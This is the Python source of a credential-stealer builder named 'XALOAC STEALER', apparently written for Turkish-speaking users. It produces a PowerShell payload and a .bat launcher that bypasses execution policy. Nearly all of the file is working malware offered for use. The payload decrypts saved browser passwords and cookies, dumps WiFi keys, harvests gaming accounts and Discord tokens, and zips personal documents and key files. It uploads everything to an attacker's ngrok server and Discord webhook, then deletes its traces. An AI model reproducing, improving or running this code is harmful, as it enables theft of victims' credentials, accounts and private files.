# xaloAC-x410m1s0
"""
XALOAC STEALER v5.0 - BUILDER
Author: x410m1s0
"""

import base64
import os
import sys
import requests
import random
import string

def banner():
    print("""
    ╔══════════════════════════════════════════╗
    ║  XALOAC STEALER v1.2.0 - BUILDER         ║
    ║  Author: x410m1s0                        ║
    ╚══════════════════════════════════════════╝
    """)

def get_config():
    url = input("    Sunucu URL (ngrok): ").strip().rstrip('/')
    wh = input("    Discord Webhook (bos gecebilirsin): ").strip()
    return url, wh

def rnd(n=8):
    return ''.join(random.choices(string.ascii_letters, k=n))

def generate_ps1(server, webhook):
    """PowerShell payload'unu .ps1 dosyasi olarak kaydet"""
    
    a = rnd(6)
    b = rnd(6)
    c = rnd(8)
    d = rnd(8)
    e = rnd(6)
    f = rnd(6)
    g = rnd(6)
    h = rnd(6)
    
    ps_code = f'''$ErrorActionPreference="SilentlyContinue"
$ProgressPreference="SilentlyContinue"
[Console]::OutputEncoding=[Text.Encoding]::UTF8
$a="{server}"
$b="{webhook}"
function {c}($x){{try{{$j=$x|ConvertTo-Json -Depth 3 -Compress;$body=[Text.Encoding]::UTF8.GetBytes($j);iwr "$$a/info" -Method Post -Body $body -ContentType "application/json" -TimeoutSec 15 -UseBasicParsing}}catch{{}}}}
function {d}($p,$n){{try{{iwr "$$a/upload" -Method Post -Body ([IO.File]::ReadAllBytes($p)) -ContentType "application/octet-stream" -Headers @{{"X-Filename"=$n}} -TimeoutSec 180 -UseBasicParsing}}catch{{}}}}
function {e}($m){{if($b){{try{{if($m.Length -gt 1900){{$m=$m.Substring(0,1900)}};iwr $b -Method Post -Body (ConvertTo-Json @{{content=$m}}) -ContentType "application/json" -UseBasicParsing}}catch{{}}}}}}
function {f}($enc){{try{{if($enc -is [string]){{$enc=[Text.Encoding]::UTF8.GetBytes($enc)}}if($enc.Length -gt 3 -and $enc[0] -eq 0x76){{$n=$enc[3..14];$ct=$enc[15..($enc.Length-17)];$t=$enc[($enc.Length-16)..($enc.Length-1)];$ek=[Convert]::FromBase64String((gc "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Local State" -Raw -ErrorAction SilentlyContinue|ConvertFrom-Json).os_crypt.encrypted_key);$mk=[Security.Cryptography.ProtectedData]::Unprotect($ek[5..($ek.Length-1)],$null,0);$aes=[Security.Cryptography.AesGcm]::new($mk);$pt=New-Object byte[]($ct.Length);$aes.Decrypt($n,$ct,$t,$pt);return [Text.Encoding]::UTF8.GetString($pt)}}else{{$dr=[Security.Cryptography.ProtectedData]::Unprotect($enc,$null,0);return [Text.Encoding]::UTF8.GetString($dr)}}}}catch{{return $null}}}}
Write-Host "[XALOAC] Baslatiliyor..." -ForegroundColor Red
$computer=$env:COMPUTERNAME;$user=$env:USERNAME
$os=try{{(gwmi Win32_OperatingSystem).Caption}}catch{{"?"}}
$hwid=try{{(gwmi Win32_ComputerSystemProduct).UUID}}catch{{"?"}}
$cpu=try{{(gwmi Win32_Processor).Name}}catch{{"?"}}
$ram=try{{[math]::Round((gwmi Win32_ComputerSystem).TotalPhysicalMemory/1GB,2)}}catch{{0}}
$gpu=try{{(gwmi Win32_VideoController)[0].Name}}catch{{"?"}}
$screen=try{{$s=gwmi Win32_VideoController;"$($s.CurrentHorizontalResolution)x$($s.CurrentVerticalResolution)"}}catch{{"?"}}
$lang=try{{(Get-WinUserLanguageList)[0].LanguageTag}}catch{{"?"}}
$tz=try{{(Get-TimeZone).Id}}catch{{"?"}}
$av=try{{$w=gwmi -Namespace "root\\SecurityCenter2" -Class AntiVirusProduct -ErrorAction SilentlyContinue;if($w){{$w[0].displayName}}else{{"?"}}}}catch{{"?"}}
$admin=([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
$vm=try{{if((gwmi Win32_BIOS).SerialNumber -match "VMware|VirtualBox|Xen|QEMU|00000"){{1}}else{{0}}}}catch{{0}}
$ip=try{{(iwr "https://api.ipify.org" -UseBasicParsing -TimeoutSec 5).Content.Trim()}}catch{{"?"}}
$time=Get-Date -Format "yyyy-MM-dd HH:mm:ss"
Write-Host "[XALOAC] Sistem: $computer | $user | $ip" -ForegroundColor Green
{c} @{{computer=$computer;user=$user;ip=$ip;os=$os;hwid=$hwid;cpu=$cpu;ram=$ram;gpu=$gpu;screen=$screen;lang=$lang;tz=$tz;av=$av;admin=$admin;vm=$vm;time=$time;type="system"}}
{e} ">>> XALOAC v5.0 <<<`nPC: $computer | User: $user`nIP: $ip | OS: $os`nCPU: $cpu`nGPU: $gpu | RAM: $ram GB`nAV: $av | Admin: $admin | VM: $vm"
Write-Host "[XALOAC] WiFi taranıyor..." -ForegroundColor Yellow
$wifi=@()
try{{$pr=@();(netsh wlan show profiles)|%{{if($_ -match ":"){{$n=($_-split":",2)[1].Trim();if($n){{$pr+=$n}}}}}};$pr=$pr|select -Unique;foreach($p in $pr){{$d=netsh wlan show profile "$p" key=clear;$pw=$d|sls "Anahtar Icerigi|Key Content";if($pw){{$wifi+=@{{ssid=$p;password=($pw-split":",2)[1].Trim()}}}}}}}}catch{{}}
if($wifi.Count -gt 0){{{c} @{{type="wifi";data=$wifi}};Write-Host "[XALOAC] WiFi: $($wifi.Count) ag" -ForegroundColor Green}}
Write-Host "[XALOAC] Sifreler kırılıyor..." -ForegroundColor Yellow
$brs=@(@{{N="Chrome";P="$env:LOCALAPPDATA\\Google\\Chrome\\User Data"}},@{{N="Edge";P="$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data"}},@{{N="Brave";P="$env:LOCALAPPDATA\\BraveSoftware\\Brave-Browser\\User Data"}},@{{N="Opera";P="$env:APPDATA\\Opera Software\\Opera Stable"}})
foreach($br in $brs){{if(-not(Test-Path $br.P)){{continue}}$ap=@();$ac=@();gci $br.P -Dir -Filter "Default*|Profile*"|%{{$ld=Join-Path $_.FullName "Login Data";if(Test-Path $ld){{try{{$tmp="$env:TEMP\\l_{g}.db";cp $ld $tmp -Force;$conn=New-Object -ComObject ADODB.Connection;$conn.Open("Provider=Microsoft.ACE.OLEDB.12.0;Data Source=$tmp");$rs=$conn.Execute("SELECT origin_url,username_value,password_value FROM logins");while(-not $rs.EOF){{$url=$rs.Fields("origin_url").Value;$un=$rs.Fields("username_value").Value;$pw=$rs.Fields("password_value").Value;if($url -and $un -and $pw){{$dp={f} $pw;if($dp){{$ap+=@{{url=$url;username=$un;password=$dp}}}}}};$rs.MoveNext()}};$conn.Close();ri $tmp -Force}}catch{{}}}};$cd=Join-Path $_.FullName "Cookies";if(Test-Path $cd){{try{{$tmp="$env:TEMP\\c_{h}.db";cp $cd $tmp -Force;$conn=New-Object -ComObject ADODB.Connection;$conn.Open("Provider=Microsoft.ACE.OLEDB.12.0;Data Source=$tmp");$rs=$conn.Execute("SELECT host_key,name,encrypted_value FROM cookies");$ctr=0;while(-not $rs.EOF -and $ctr -lt 500){{$h=$rs.Fields("host_key").Value;$n=$rs.Fields("name").Value;$v=$rs.Fields("encrypted_value").Value;if($h -and $n -and $v){{$dv={f} $v;if($dv){{$ac+=@{{host=$h;name=$n;value=$dv}};$ctr++}}}};$rs.MoveNext()}};$conn.Close();ri $tmp -Force}}catch{{}}}}}};if($ap.Count -gt 0){{{c} @{{type="passwords";browser=$br.N;data=$ap}};Write-Host "[XALOAC] $($br.N): $($ap.Count) sifre" -ForegroundColor Green}};if($ac.Count -gt 0){{{c} @{{type="cookies";browser=$br.N;data=$ac}};Write-Host "[XALOAC] $($br.N): $($ac.Count) cookie" -ForegroundColor Green}}}}
Write-Host "[XALOAC] Oyun hesaplari..." -ForegroundColor Yellow
$games=@()
$sp=@("$env:ProgramFiles(x86)\\Steam\\config\\loginusers.vdf","C:\\Program Files (x86)\\Steam\\config\\loginusers.vdf")
foreach($s in $sp){{if(Test-Path $s){{try{{$sc=gc $s -Raw;$sm=[regex]::Matches($sc,'"AccountName"\\s+"([^"]+)"');if($sm.Count -gt 0){{$sa=@();foreach($x in $sm){{$sa+=$x.Groups[1].Value}};$games+=@{{platform="Steam";accounts=$sa}}}}}}catch{{}}break}}}}
$ep="$env:LOCALAPPDATA\\EpicGamesLauncher\\Saved\\Config\\Windows\\GameUserSettings.ini"
if(Test-Path $ep){{try{{$ec=gc $ep -Raw;$em=[regex]::Match($ec,"LastLoggedInUser=(.+)");if($em.Success){{$games+=@{{platform="EpicGames";accounts=@($em.Groups[1].Value.Trim())}}}}}}catch{{}}}}
$mc=@("$env:APPDATA\\.minecraft\\launcher_accounts.json","$env:APPDATA\\.minecraft\\launcher_profiles.json")
foreach($m in $mc){{if(Test-Path $m){{try{{$md=gc $m -Raw|ConvertFrom-Json;$ma=@();if($md.accounts){{foreach($acc in $md.accounts.PSObject.Properties){{$un=if($acc.Value.username){{$acc.Value.username}}else{{"?"}};$em=if($acc.Value.email){{$acc.Value.email}}else{{"?"}};$ma+="$un ($em)"}}}};if($ma.Count -gt 0){{$games+=@{{platform="Minecraft";accounts=$ma}}}}}}catch{{}}break}}}}
$rp="$env:LOCALAPPDATA\\Riot Games\\Riot Client\\Config"
if(Test-Path $rp){{try{{$ra=@();gci $rp -Recurse -Include "*.yml","*.yaml"|%{{$rc=gc $_.FullName -Raw;$rm=[regex]::Matches($rc,'username:\\s*"?([^"\\r\\n]+)"?');foreach($x in $rm){{$un=$x.Groups[1].Value.Trim();if($un){{$ra+=$un}}}}}};if($ra.Count -gt 0){{$games+=@{{platform="RiotGames";accounts=($ra|select -Unique)}}}}}}catch{{}}}}
if(Test-Path "$env:LOCALAPPDATA\\FiveM\\FiveM.app"){{$games+=@{{platform="FiveM";accounts=@("Yuklu")}}}}
if(Test-Path "$env:LOCALAPPDATA\\Rockstar Games"){{$games+=@{{platform="Rockstar";accounts=@("Yuklu")}}}}
if(Test-Path "$env:LOCALAPPDATA\\Ubisoft Game Launcher"){{$games+=@{{platform="Ubisoft";accounts=@("Yuklu")}}}}
if(Test-Path "$env:APPDATA\\discord\\Local Storage\\leveldb"){{try{{$dt=@();gci "$env:APPDATA\\discord\\Local Storage\\leveldb" -Filter "*.ldb"|%{{$dc=[Text.Encoding]::UTF8.GetString([IO.File]::ReadAllBytes($_.FullName));$dm=[regex]::Matches($dc,"([\\w-]{{24}}\\.[\\w-]{{6}}\\.[\\w-]{{27}})");foreach($x in $dm){{if($x.Value -match "^[A-Za-z0-9_=\\-]+\\.[A-Za-z0-9_=\\-]+\\.[A-Za-z0-9_=\\-]+$"){{$dt+=$x.Value}}}}}};if($dt.Count -gt 0){{$games+=@{{platform="Discord_Token";accounts=($dt|select -Unique)}}}}}}catch{{}}}}
if($games.Count -gt 0){{{c} @{{type="games";data=$games}};Write-Host "[XALOAC] Oyun: $($games.Count) platform" -ForegroundColor Green}}
Write-Host "[XALOAC] Dosyalar toplanıyor..." -ForegroundColor Yellow
$dirs=@("$env:USERPROFILE\\Desktop","$env:USERPROFILE\\Documents","$env:USERPROFILE\\Pictures","$env:USERPROFILE\\Downloads")
$exts=@("*.txt","*.jpg","*.jpeg","*.png","*.gif","*.bmp","*.webp","*.pdf","*.doc","*.docx","*.xls","*.xlsx","*.csv","*.json","*.xml","*.sql","*.db","*.env","*.key","*.pem","*.log","*.cfg","*.ini")
$fl=@();$tsz=0;$msz=100MB
foreach($dr in $dirs){{if(-not(Test-Path $dr)){{continue}};foreach($ex in $exts){{if($tsz -ge $msz){{break}};try{{gci $dr -Recurse -Filter $ex -ErrorAction SilentlyContinue|?{{$_.Length -lt 10MB -and $_.Length -gt 10}}|%{{if($tsz -ge $msz){{return}};$script:fl+=$_.FullName;$script:tsz+=$_.Length}}}}catch{{}}}}}}
if($fl.Count -gt 0){{try{{$zp="$env:TEMP\\z_{g}.zip";Compress-Archive -Path $fl -DestinationPath $zp -CompressionLevel Fastest -Force;if(Test-Path $zp){{{d} $zp "stolen_data.zip";$sz=[math]::Round($tsz/1MB,2);Write-Host "[XALOAC] $($fl.Count) dosya ($sz MB)" -ForegroundColor Green;ri $zp -Force}}}}catch{{}}}}
gci $env:TEMP -Filter "*.zip"|ri -Force -ErrorAction SilentlyContinue
gci $env:TEMP -Filter "*.db"|ri -Force -ErrorAction SilentlyContinue
Write-Host "[XALOAC] TAMAMLANDI!" -ForegroundColor Red
Write-Host "[XALOAC] 10 saniye sonra kapanacak..." -ForegroundColor Yellow
Start-Sleep -Seconds 10'''

    return ps_code

def create_files(ps_code, output_dir):
    ps1_path = os.path.join(output_dir, "XALOAC_Master.ps1")
    bat_path = os.path.join(output_dir, "XALOAC_Master.bat")
    
    with open(ps1_path, 'w', encoding='utf-8') as f:
        f.write(ps_code)
    
    bat_content = '''@echo off
title XALOAC STEALER v5.0 - x410m1s0
color 04
chcp 65001 >nul 2>&1
cls
echo.
echo           ╔══════════════════════════════════════════╗
echo           ║       XALOAC STEALER v5.0              ║
echo           ║       Author: x410m1s0                 ║
echo           ╚══════════════════════════════════════════╝
echo.
echo           [!] Islem devam ediyor...
echo           [!] Lutfen pencereyi kapatmayin!
echo.
echo           ========================================
echo.

powershell -ExecutionPolicy Bypass -NoProfile -File "%~dp0XALOAC_Master.ps1"

echo.
echo           ========================================
echo           Islem tamamlandi! Pencere kapanacak...
pause >nul
exit
'''
    
    with open(bat_path, 'w', encoding='utf-8') as f:
        f.write(bat_content)
    
    return bat_path, ps1_path

def main():
    banner()
    
    url, wh = get_config()
    if not url:
        print("\n    [!] URL gerekli!")
        return
    
    print(f"\n    [*] Sunucu kontrol: {url}/ping")
    try:
        r = requests.get(f"{url}/ping", timeout=5)
        if r.status_code == 200:
            print(f"    [+] Sunucu aktif: {r.text}")
        else:
            print(f"    [-] Hata: {r.status_code}")
            return
    except Exception as ex:
        print(f"    [-] Hata: {ex}")
        return
    
    print("\n    [*] PS1 payload olusturuluyor...")
    ps_code = generate_ps1(url, wh)
    
    print("    [*] Dosyalar olusturuluyor...")
    desktop = os.path.join(os.path.expanduser("~"), "Desktop")
    bat_path, ps1_path = create_files(ps_code, desktop)
    
    print(f"""
    ╔══════════════════════════════════════════╗
    ║           HAZIR!                        ║
    ╠══════════════════════════════════════════╣
    ║  BAT: {bat_path}
    ║  PS1: {ps1_path}
    ║                                        ║
    ║  IKISI AYNI KLASORDE OLMALI!           ║
    ║  Panel: {url}                           ║
    ╚══════════════════════════════════════════╝
    """)

if __name__ == "__main__":
    main()